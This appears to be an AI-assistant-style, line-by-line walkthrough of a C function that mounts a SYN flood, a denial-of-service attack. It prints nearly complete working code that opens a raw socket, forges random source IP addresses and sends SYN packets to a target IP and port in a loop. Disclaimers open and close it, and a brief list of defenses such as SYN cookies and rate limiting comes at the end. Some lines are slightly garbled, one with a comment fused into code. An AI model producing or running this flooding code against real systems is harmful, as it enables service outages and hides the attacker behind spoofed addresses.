Okay, let's take a closer look at the code of the `syn_flood` function, which implements the SYN flood attack.  Understanding this code will help you better understand the principles of network security and network protocols, as well as give you an understanding of what can be done to protect against such attacks.

** Important!** This code is intended for educational purposes only.  Using this code to attack other people's systems without permission is illegal and can lead to serious consequences. Do not use this code for malicious purposes.

**The general essence of the SYN-flood attack:**

A SYN flood attack is a type of denial of service (DoS) attack that aims to overload a server by sending large numbers of SYN packets.  Upon receiving a SYN packet, the server allocates resources to establish a TCP connection (sends a SYN ACK and waits for the ACK).  If the server receives too many SYN packets, it may run out of resources (memory, ports) and stop responding to requests from legitimate users.

**Parsing the `syn_flood` code line by line:**

```c
void syn_flood(const char *target_ip, int target_port, int packet_count) {
```

* `void syn_flood(const char *target_ip, int target_port, int packet_count)`:
* Declaration of the `syn_flood` function.
    * `void`: The function returns nothing.
    * `const char *target_ip': A pointer to a string containing the IP address of the target of the attack. 'const` means that the function will not modify this string.
    * `int target_port': The port on the server that will be attacked.
    * `int packet_count': The number of SYN packets to be sent.

```c
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s < 0) {
        error("Error creating a raw socket");
        exit(EXIT_FAILURE);
    }
```

*   `int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);`:
    * `socket()`: Socket creation function.  A socket is an endpoint of communication.
    * `AF_INET': A family of addresses (IPv4).
    * `SOCK_RAW': Socket type.  SOCK_RAW allows you to create and send raw IP packets, which is necessary to create SYN packets manually.
    * `IPPROTO_RAW': Protocol (in this case, raw IP).
    *   `s`:  The socket descriptor (integer) used for further operations with the socket.
    * `if(s < 0) { ... }`: Checking for an error when creating a socket. If socket() returns a value less than 0, an error has occurred.
        * `error("Error creating a raw socket")`: Outputs an error message to the standard error stream (stderr).
        * `exit(EXIT_FAILURE)': Terminates the program with an error code.

``c
// Enabling manual filling of the IP header
    int one = 1;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        error("setsockopt error");
        close(s);
        exit(EXIT_FAILURE);
    }
```

*   `int one = 1;`:  The `one` variable is created and assigned the value 1. This variable is used to enable the `IP_HDRINCL` option.
*   `if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)`:
* `setsockopt()': A function for setting socket options.
    *   `s`:  The handle of the socket created earlier.
    * `IPPROTO_IP': Indicates that the option is related to the IP protocol.
    * 'IP_HDRINCL': An option that indicates to the operating system that we (the program) are going to fill in the IP header ourselves (instead of the operating system doing it for us).  This is necessary to create fake IP packets.
    * `&one`: A pointer to the option value (in this case, `one`, which is 1 – enable option).
    *   `sizeof(one)`: The size of the `one` variable.
    *   `if(...) < 0`: Checking for an error.
        * `error("setsockopt error")': Displays an error message.
        * `close(s)`: Closes the socket (if it was created, but an error occurred).
        * `exit(EXIT_FAILURE)': Ends the program.

```c
    char packet[PACKET_LEN];
    struct sockaddr_in sin;
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
```

*   `char packet[PACKET_LEN];`:
    * Declaring a `packet` array of type `char'.  This array will be used to store the entire created packet (IP header + TCP header).
    * `PACKET_LEN': It is assumed that `PACKET_LEN' is defined somewhere in the program (for example, `#define PACKET_LEN 60`).  There is usually enough size for IP and TCP headers.
*   `struct sockaddr_in sin;`:
    * Declaring a `sin` structure of type `sockaddr_in'.  This structure will contain information about the destination address (IP address and port).
*   `struct iphdr *iph = (struct iphdr *)packet;`:
    * `struct iphdr *iph`: We declare the pointer `iph` of type `struct iphdr'.  The 'struct iphdr` is the structure representing the IP header (defined in `<netinet/ip.h>` or a similar header file).
    * `(struct iphdr *)packet`: We "tell" the compiler: "Consider that the first bytes of the `packet` array represent the IP header."  We will convert the pointer to the `packet` array to a pointer to the `struct iphdr'.
    * `iph = ...`: `iph` now points to the beginning of the `packet` array, but we consider it as an IP header structure.
*   `struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));`:
    * `struct tcphdr *tcph`: We declare a pointer `tcph` of type `struct tcphdr'.  The 'struct tcphdr` is a structure representing the TCP header (defined in `<netinet/tcp.h>` or a similar header file).
    *   `(packet + sizeof(struct iphdr))`: We calculate the address of the beginning of the TCP header.  We take the address of the beginning of the `packet` array and add to it the size of the IP header (`sizeof(struct iphdr)`).  Thus, the TCP header will be located immediately after the IP header in memory.
    * `tcph = ...`: `tcph' now points to the beginning of the TCP header in the 'packet` array.

```c
    // Setting
the memset destination address(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
```

* `memset(&sin, 0, sizeof(sin));`: Resets the structure of `sin'.  This is necessary to clear all its fields before filling in.
* `sin.sin_family = AF_INET;`: Sets the address family (IPv4).
* `sin.sin_port = htons(target_port);`: Sets the destination port.  'htons()` converts the port number from host byte order to network byte order.
*   `sin.sin_addr.s_addr = inet_addr(target_ip);`: Sets the destination IP address.  'inet_addr()` converts a string with an IP address (for example, "192.168.1.1") to the format used in the `sockaddr_in` structures.

```c
    printf("[+] Starting the SYN flood %s:%d\n ", target_ip, target_port);
```

*   `printf(...)`: Displays a message about the start of the attack.

```c
    for(int i = 1; i <= packet_count; i++) {
        memset(packet, 0, PACKET_LEN);
```

*   `for(int i = 1; i <= packet_count; i++)`: A loop that will be executed `packet_count` times.  One SYN packet will be sent in each iteration.
* `memset(packet, 0, PACKET_LEN);`: Resets the entire `packet` buffer before creating a new packet. This cleans up the old data to avoid errors.

```c
        // Filling in the IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htonl(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->daddr = sin.sin_addr.s_addr;

        // Generating a random source IP
        char *random_ip = generate_random_ip();
        iph->saddr = inet_addr(random_ip);
```

* **Filling in the IP header:** Here the fields of the IP header are filled in, which are used to control packet routing:
* `iph->ihl = 5;`:  The length of the IP header in 32-bit words (5 * 4 = 20 bytes, the standard size of the IP header).
    * `iph->version = 4;`: IP version (IPv4).
    * `iph->tos = 0;`: Service type (TOS).  It is usually used to determine the priority of a packet.
    *   `iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);`: Total packet length (IP header + TCP header).
    * `iph->id = htonl(rand() %65535);`: Packet ID (for fragmentation).  'htonl()` converts the identifier number from host byte order to network byte order.  We generate a random number so that the packages have different IDs.
    *   `iph->frag_off = 0;`:  Fragment offset (used for packet fragmentation).
    * `iph->ttl = 64;`: Packet lifetime (TTL).  Determines how many hops through routers a packet can go through before it is dropped.
    * `iph->protocol = IPPROTO_TCP;`: Protocol (TCP).
    * `iph->check = 0;`: Header checksum (we will calculate it later).  Initially, we set it to 0.
    * `iph->daddr = sin.sin_addr.s_addr;`: Destination IP address (from the `sin` structure that we filled in earlier).
    * `char *random_ip = generate_random_ip();`: Calling the function `generate_random_ip()` (which we analyzed earlier) to generate a random source IP address.  It is important to use a fake source IP address to make the callback more difficult.
    * `iph->saddr = inet_addr(random_ip);`: Set a random source IP address in the IP header.

```c
        // Filling in the TCP header
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(target_port);
        tcph->seq = htonl(rand() % 4294967295);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1; // Setting the SYN flag
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;
```

* **Filling in the TCP header:** Here the fields of the TCP header are filled in.  This is where we create the SYN packet (set the `SYN` flag).
    * `tcph->source =htons(rand() %65535);`: Random source port.
    * `tcph->dest =htons(target_port);`: Destination port (target of attack).
    * `tcph->seq = htonl(rand() %4294967295);`: Random sequence number (seq).  It is important that it is random to make it more difficult to defend against an attack.
    * `tcph->ack_seq = 0;`: Confirmation number (ack_seq).  It is not used in SYN packets.
    *   `tcph->doff = 5;`:  The length of the TCP header in 32-bit words (5 * 4 = 20 bytes, the standard size of the TCP header).
    * `tcph->fin = 0;`: Flag FIN (connection termination).  It is not used in SYN packets.
    * `tcph->syn = 1;`: **The SYN flag is set to 1.** This indicates to the server that this is a request to establish a TCP connection.  **This is what makes a SYN packet a packet!**
* `tcph->rst = 0;`: The RST flag (connection reset).  Not used.
    * `tcph->psh = 0;`: The PSH flag (push - immediate data transfer).  Not used.
    * `tcph->ack = 0;`: The ACK (confirmation) flag.  Not used.
    * `tcph->urg = 0;`: The URG flag (urgent - urgent data).  Not used.
    * `tcph->window =htons(5840);`: The size of the receiving window.
    *   `tcph->check = 0;`: The checksum of the TCP header (to be calculated later).
    *   `tcph->urg_ptr = 0;`: A pointer to urgent data.  Not used.

```c
        // Calculation of checksums
        iph->check = checksum((unsigned short *)packet, iph->tot_len >> 1);
```

*   `iph->check = checksum((unsigned short *)packet, iph->tot_len >> 1);`:
    * We calculate the checksum of the IP header using the checksum function (which we analyzed earlier).
    * `iph->tot_len >> 1`: Divide `iph->tot_len` (total packet length) by 2. `>> 1` is a right shift of 1 bit, which is equivalent to dividing by 2. We pass to the checksum function only the size of the IP header, which is usually equal to 20 bytes (therefore, it must be divided by 2 for checksum to work correctly)
* 'iph->check = ...`: Save the calculated checksum in the `check' field of the IP header.

```c
        // Pseudo headers for TCP checksum
        struct {
            u_int32_t saddr;
            u_int32_t daddr;
            u_int8_t zero;
            u_int8_t protocol;
            u_int16_t tcp_len;
        } pseudo_header;

        pseudo_header.saddr = iph->saddr;
        pseudo_header.daddr = iph->daddr;
        pseudo_header.zero = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.tcp_len = htons(sizeof(struct tcphdr));

        int psize = sizeof(pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, (char *)&pseudo_header, sizeof(pseudo_header));
        memcpy(pseudogram + sizeof(pseudo_header), tcph, sizeof(struct tcphdr));

        tcph->check = checksum((unsigned short *)pseudogram, psize / 2);
        free(pseudogram);
```

* **TCP Checksum calculation:** The TCP checksum (unlike IP) includes not only the TCP header, but also *pseudo-headers*. The pseudo header contains information from the IP header (source and destination addresses, protocol) that is needed to protect against routing attacks.
    * Creating the `pseudo_header` structure:
        * `u_int32_t saddr;` - Source IP address (4 bytes)
        * `u_int32_t daddr;` - Destination IP address (4 bytes)
* `u_int8_t zero;` - Reserved (1 byte)
        * 'u_int8_t protocol;` - Protocol (TCP = 6) (1 byte)
        * `u_int16_t tcp_len;` is the length of the TCP header (2 bytes)
* We fill in the `pseudo_header' with information from the IP header and TCP header.
    * We allocate memory for the pseudo header + TCP header (`pseudogram').
    * Copy the contents of the `pseudo_header` and TCP header to the `pseudogram'.
    * Calculate the checksum for the `pseudogram` using the 'checksum` function.
    * Save the result in `tcph->check'.
    * Freeing up the allocated memory (`free(pseudogram);` ).
```c
        // Sending a package
        if(sendto(s, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            error("sendto error");
        } else {
            printf("[+] Packet sent #%d from %s\n", i, random_ip);
        }
```

*   `if(sendto(s, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)`:
    *   `sendto()`: A function for sending data over a socket.
    *   `s`:  The socket descriptor.
    * `packet': A pointer to the data to be sent (the entire packet that we have collected).
    * 'iph->tot_len': Packet length in bytes (IP header + TCP header).
    * `0`: Flags (usually 0).
    *   `(struct sockaddr *)&sin`: A pointer to the `sin` structure (with information about the destination address).
    * `sizeof(sin)`: The size of the `sin` structure.
    *   `if(...) < 0`: Checking for an error.
        * `error("sendto error")`: Displays an error message.
*   `else { ... }`:
    * `printf("[+] Packet #%d from %s\n has been sent", i, random_ip);`: Displays a message about the successful sending of the packet, specifying the packet number and the random IP address of the source.

```c
        usleep(10000); // 10 ms delay between packets
    }
```

* `usleep(10000);': A delay of 10 milliseconds (0.01 seconds) between sending each packet.  This helps to avoid network congestion and distribute packets more efficiently.
* `close(s);`: Closes the socket.

**Short conclusion:**

This function creates "raw" SYN packets by configuring IP and TCP headers, faking the source IP address and sending them to the specified port of the target IP address. She does this repeatedly to try to overload the target server and cause a denial of service.

**Why is it dangerous and what can be done to protect it:**

* **IP address forgery:** The attacker fakes the source IP address (uses random IP addresses). This makes it difficult to track and block the attack.
* **Large number of packages:** A lot of packets are being sent, which can overload the server.
* **Protection:**
    * **Firewall:** It can block suspicious packets.
    *   **SYN cookies:** A special SYN flood protection method that allows the server to process requests without allocating resources.
    * **Rate limiting:** Limit the number of SYN packets that the server receives from one IP address over a certain period of time.
    *   **IPS (Intrusion Prevention System):** The intrusion prevention system can detect and block SYN flood attacks.
    * **Upstream filtering:** Traffic filtering at the provider level.

** Attention!** This code should only be used for training and testing purposes in a controlled environment. Do not use it to attack real systems without permission!